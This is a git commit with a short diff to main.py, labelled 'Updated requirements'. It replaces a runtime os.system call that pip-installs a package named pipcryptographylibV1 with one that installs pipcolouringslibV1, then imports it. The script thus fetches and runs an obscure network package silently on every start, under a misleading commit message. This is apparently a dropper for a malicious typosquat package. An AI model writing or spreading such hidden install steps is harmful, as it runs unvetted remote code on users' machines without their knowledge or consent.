9e245aef1a5dde62f35e95751a990090061917ff
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-04-23 00:56:21 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptographylibV1")
-import pipcryptographylibV1
+os.system("pip install pipcolouringslibV1")
+import pipcolouringslibV1
 import random
 import requests
 import time
